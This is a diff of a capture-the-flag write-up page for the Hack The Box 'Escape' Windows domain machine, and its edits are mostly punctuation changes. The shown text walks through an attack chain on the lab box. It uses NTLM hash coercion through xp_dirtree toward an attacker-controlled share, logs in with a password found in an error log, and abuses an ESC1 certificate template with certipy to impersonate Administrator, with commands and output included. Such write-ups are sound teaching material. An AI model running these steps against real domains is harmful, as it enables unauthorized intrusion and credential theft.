@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-escape/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -197,9 +197,9 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows AD box with MSSQL exposed and no web server. Cleaner attack surface than most - you&rsquo;re not sifting through web directories waiting for gobuster to finish. The path here chains three separate credential finds, each one unlocking the next: a PDF in a public share, a SQL error log, and an ADCS certificate template open to any domain user. The ESC1 at the end is worth understanding because it shows up constantly in real environments.</p>
+                <p>Windows AD box with MSSQL exposed and no web server. Cleaner attack surface than most. You&rsquo;re not sifting through web directories waiting for gobuster to finish. The path here chains three separate credential finds, each one unlocking the next: a PDF in a public share, a SQL error log, and an ADCS certificate template open to any domain user. The ESC1 at the end is worth understanding because it shows up constantly in real environments.</p>
 <h2 id="recon">Recon</h2>
-<p>10.129.228.253, domain <code>sequel.htb</code>, DC hostname <code>dc</code>. Standard AD ports up - Kerberos, LDAP, SMB, WinRM - plus MSSQL 2019 on 1433. No web server, which narrows down where to start.</p>
+<p>10.129.228.253, domain <code>sequel.htb</code>, DC hostname <code>dc</code>. Standard AD ports up, Kerberos, LDAP, SMB, WinRM, plus MSSQL 2019 on 1433. No web server, which narrows down where to start.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -sC -T4 10.129.228.253
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
 </span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
@@ -221,7 +221,7 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc mssql 10.129.228.253 -u PublicUser -p GuestUserCantWrite1 --local-auth
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> DC<span class="se">\P</span>ublicUser:GuestUserCantWrite1
 </span></span></code></pre></div><h2 id="ntlm-hash-coercion-via-xp_dirtree">NTLM Hash Coercion via xp_dirtree</h2>
-<p>Logged into MSSQL as PublicUser - low-privilege guest account with no <code>xp_cmdshell</code> access. But there&rsquo;s a different stored procedure worth trying: <code>xp_dirtree</code>. It makes SQL Server enumerate a directory path, which can be a remote UNC path over SMB. When SQL Server reaches out over SMB to resolve a UNC path like <code>\\&lt;attacker&gt;\share</code>, it authenticates using the NTLM hash of whatever account the SQL service is running as.</p>
+<p>Logged into MSSQL as PublicUser, a low-privilege guest account with no <code>xp_cmdshell</code> access. But there&rsquo;s a different stored procedure worth trying: <code>xp_dirtree</code>. It makes SQL Server enumerate a directory path, which can be a remote UNC path over SMB. When SQL Server reaches out over SMB to resolve a UNC path like <code>\\&lt;attacker&gt;\share</code>, it authenticates using the NTLM hash of whatever account the SQL service is running as.</p>
 <p>Responder sat on tun0, waiting:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I tun0 -v
 </span></span></code></pre></div><p>Then triggered the connection from MSSQL:</p>
@@ -236,7 +236,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p>Once inside as sql_svc, I poked around the filesystem. <code>C:\SQLServer\Logs\</code> had <code>ERRORLOG.BAK</code>. Pulled it locally and grepped through it:</p>
 <pre tabindex="0"><code>2022-11-18 13:43:07.44 Logon  Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match.
 2022-11-18 13:43:07.48 Logon  Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match.
-</code></pre><p>Classic. Someone opened a login prompt for MSSQL, typed their domain username in the first field, then when the cursor jumped to the password field they typed the password - but they&rsquo;d apparently typed the password in the username field and the username in the password field, in reverse order. Two consecutive failed logins: one for the username and one for the password entered as a username.</p>
+</code></pre><p>Classic. Someone opened a login prompt for MSSQL, typed their domain username in the first field, then when the cursor jumped to the password field they typed the password. But they&rsquo;d apparently typed the password in the username field and the username in the password field, in reverse order. Two consecutive failed logins: one for the username and one for the password entered as a username.</p>
 <p>The plaintext password is sitting in the MSSQL error log: <code>Ryan.Cooper:NuclearMosquito3</code>. Tested it:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm 10.129.228.253 -u Ryan.Cooper -p <span class="s1">&#39;NuclearMosquito3&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3 <span class="o">(</span>Pwn3d!<span class="o">)</span>
@@ -249,7 +249,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="s2">&#34;[!] Vulnerabilities&#34;</span><span class="err">:</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&#34;ESC1&#34;</span><span class="p">:</span> <span class="s2">&#34;Enrollee supplies subject and template allows client authentication.&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>ESC1 is the combination of two flags on a certificate template. The first is &ldquo;Enrollee Supplies Subject&rdquo; - normally the CA controls what identity goes into the certificate&rsquo;s Subject field. With this flag set, the person requesting the certificate gets to specify the subject, including the UPN (user principal name). The second requirement is that the template enables Client Authentication, meaning the resulting certificate can be used to prove identity to Kerberos. Put those two together and any user who can enroll in the template can request a certificate that says they&rsquo;re Administrator.</p>
+</span></span></code></pre></div><p>ESC1 is the combination of two flags on a certificate template. The first is &ldquo;Enrollee Supplies Subject.&rdquo; Normally the CA controls what identity goes into the certificate&rsquo;s Subject field. With this flag set, the person requesting the certificate gets to specify the subject, including the UPN (user principal name). The second requirement is that the template enables Client Authentication, meaning the resulting certificate can be used to prove identity to Kerberos. Put those two together and any user who can enroll in the template can request a certificate that says they&rsquo;re Administrator.</p>
 <p>Domain Users can enroll in UserAuthentication. Ryan is a domain user.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u ryan.cooper@sequel.htb -p <span class="s1">&#39;NuclearMosquito3&#39;</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -dc-ip 10.129.228.253 -target dc.sequel.htb <span class="se">\
@@ -259,7 +259,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;administrator@sequel.htb&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
-</span></span></code></pre></div><p>Then authenticate with the certificate to get the Administrator NT hash. The nmap output flagged an 8-hour clock skew between my machine and the DC - Kerberos rejects tickets more than 5 minutes off, so I needed to account for that:</p>
+</span></span></code></pre></div><p>Then authenticate with the certificate to get the Administrator NT hash. The nmap output flagged an 8-hour clock skew between my machine and the DC. Kerberos rejects tickets more than 5 minutes off, so I needed to account for that:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f <span class="s1">&#39;+8h2s&#39;</span> certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
@@ -391,6 +391,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
